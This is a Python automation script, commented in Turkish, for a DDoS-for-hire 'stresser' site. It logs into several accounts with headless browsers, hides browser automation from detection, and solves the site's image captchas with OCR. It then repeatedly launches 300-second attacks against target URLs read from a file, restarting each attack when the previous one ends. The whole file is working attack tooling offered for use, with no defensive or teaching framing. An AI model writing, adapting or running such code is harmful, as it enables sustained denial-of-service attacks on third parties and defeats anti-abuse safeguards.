import threading, time, os, re, base64, io, sys, logging
from playwright.sync_api import sync_playwright
from PIL import Image
import ddddocr

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)
ocr = ddddocr.DdddOcr()

class DDoSNow:
    def __init__(self):
        self.base_url = "https://cryptostresser.ba"
        self.accounts = self.load_accounts()
        self.running = {}
        
    def load_accounts(self):
        accounts = []
        if not os.path.exists("accounts.txt"):
            with open("accounts.txt", "w") as f:
                f.write("test:pass:https://example.com\n")
            return []
        with open("accounts.txt", "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    p = line.split(":")
                    if len(p) >= 3:
                        accounts.append({"user": p[0], "pass": p[1], "target": p[2]})
                        logger.info(f"Hesap: {p[0]} -> {p[2]}")
        return accounts
    
    def solve_captcha(self, page):
        """Captcha çöz - cryptostresser.ba için"""
        try:
            # Deploy Attack butonuna tıkla
            deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").first
            deploy_btn.click()
            time.sleep(2)
        except:
            return False
            
        while True:
            try:
                # Captcha görselini bul
                img = page.locator("img[alt='captcha']").first
                if img.count() == 0:
                    time.sleep(1)
                    continue
                    
                img_src = img.get_attribute("src")
                if not img_src or not img_src.startswith("data:image"):
                    time.sleep(1)
                    continue
                    
                # OCR ile çöz
                b64 = re.sub(r'^data:image/\w+;base64,', '', img_src)
                text = re.sub(r'[^A-Z0-9]', '', ocr.classification(Image.open(io.BytesIO(base64.b64decode(b64)))).upper())
                
                if not text:
                    time.sleep(1)
                    continue
                    
                logger.info(f"OCR: {text}")
                
                # Captcha input'u doldur
                captcha_input = page.locator("input[name='captcha']").first
                captcha_input.fill("")
                time.sleep(0.5)
                captcha_input.fill(text)
                time.sleep(1)
                
                # Deploy butonuna tıkla
                deploy_btn2 = page.locator("button[type='submit'].btn-confirm").first
                deploy_btn2.click()
                time.sleep(3)
                
                # Hata kontrolü
                if page.locator("text=Invalid captcha").count() > 0:
                    logger.info(f"Yanlış captcha: {text}, tekrar deneniyor...")
                    captcha_input.fill("")
                    time.sleep(1)
                    continue
                    
                logger.info("Attack başlatıldı!")
                return True
                
            except Exception as e:
                logger.error(f"Captcha hatası: {e}")
                time.sleep(2)
                continue
    
    def worker(self, acc):
        user = acc["user"]
        pwd = acc["pass"]
        target = acc["target"]
        
        while self.running.get(user, False):
            try:
                with sync_playwright() as p:
                    ctx = p.chromium.launch_persistent_context(
                        user_data_dir=f"profiles/{user}",
                        headless=True,
                        args=['--no-sandbox', '--disable-setuid-sandbox'],
                        viewport={"width": 1280, "height": 720}
                    )
                    page = ctx.new_page()
                    page.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined})")
                    
                    # ---- LOGIN ----
                    logger.info(f"[{user}] Giriş yapılıyor...")
                    page.goto(f"{self.base_url}/login", timeout=60000)
                    page.wait_for_load_state("networkidle", timeout=30000)
                    time.sleep(2)
                    
                    page.fill("input[name='username']", user)
                    page.fill("input[name='password']", pwd)
                    page.click("button[type='submit']")
                    time.sleep(3)
                    
                    # ---- HUB ----
                    logger.info(f"[{user}] Hub sayfasına gidiliyor...")
                    page.goto(f"{self.base_url}/hub", timeout=60000)
                    page.wait_for_load_state("networkidle", timeout=30000)
                    time.sleep(2)
                    
                    if "login" in page.url:
                        logger.error(f"[{user}] Giriş başarısız!")
                        time.sleep(30)
                        continue
                    
                    logger.info(f"[{user}] Giriş başarılı!")
                    
                    # ---- ANA SALDIRI DÖNGÜSÜ ----
                    while self.running.get(user, False):
                        try:
                            # Hedef URL - name="hub.0.host"
                            target_input = page.locator("input[name='hub.0.host']").first
                            target_input.fill(target, timeout=10000)
                            
                            # Süre - slider id="hub.0.time", max 300
                            time_input = page.locator("input#hub.0.time").first
                            time_input.fill("300", timeout=5000)
                            
                            # Captcha çöz
                            logger.info(f"[{user}] Captcha çözülüyor...")
                            if not self.solve_captcha(page):
                                logger.warning(f"[{user}] Captcha çözülemedi!")
                                page.reload()
                                time.sleep(3)
                                continue
                            
                            logger.info(f"[{user}] Attack başladı! - {target}")
                            
                            # Süre takibi
                            while self.running.get(user, False):
                                try:
                                    # Badge kontrolü
                                    badge = page.locator(".accordion-button .badge").first
                                    if badge.count() > 0:
                                        t = badge.text_content().strip()
                                        logger.info(f"[{user}] Kalan: {t}")
                                        if t in ["0m 0s", "0s"]:
                                            logger.info(f"[{user}] Süre doldu!")
                                            break
                                    else:
                                        # Running kontrolü
                                        running = page.locator(".stats-content .badge:has-text('Running')").first
                                        if running.count() == 0:
                                            logger.info(f"[{user}] Attack bitti!")
                                            break
                                except:
                                    pass
                                time.sleep(5)
                            
                            # Yeniden başlat
                            logger.info(f"[{user}] Yeniden başlatılıyor...")
                            page.reload()
                            time.sleep(3)
                            
                            if "/hub" not in page.url:
                                page.goto(f"{self.base_url}/hub")
                                time.sleep(2)
                            
                        except Exception as e:
                            logger.error(f"[{user}] İşlem hatası: {e}")
                            page.reload()
                            time.sleep(3)
                            continue
                    
                    ctx.close()
                    
            except Exception as e:
                logger.error(f"[{user}] Kritik hata: {e}")
                time.sleep(10)
    
    def start(self):
        if not self.accounts:
            logger.error("accounts.txt boş veya yok!")
            return
            
        logger.info(f"{len(self.accounts)} hesap başlatılıyor...")
        for a in self.accounts:
            self.running[a["user"]] = True
            t = threading.Thread(target=self.worker, args=(a,), daemon=True)
            t.start()
            logger.info(f"[{a['user']}] Başlatıldı -> {a['target']}")
            time.sleep(2)
        
        # Durum raporu
        while True:
            time.sleep(60)
            logger.info("="*50)
            logger.info("AKTİF HESAPLAR:")
            for u, r in self.running.items():
                target = next((a["target"] for a in self.accounts if a["user"] == u), "?")
                logger.info(f"  {u}: {'✅ Çalışıyor' if r else '⛔ Durduruldu'} -> {target}")
            logger.info("="*50)

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════╗
    ║   CRYPTOSTRESSER.BA - DDOS AUTOMATION     ║
    ║   Multi-Account Attack System             ║
    ╚═══════════════════════════════════════════╝
    """)
    DDoSNow().start()
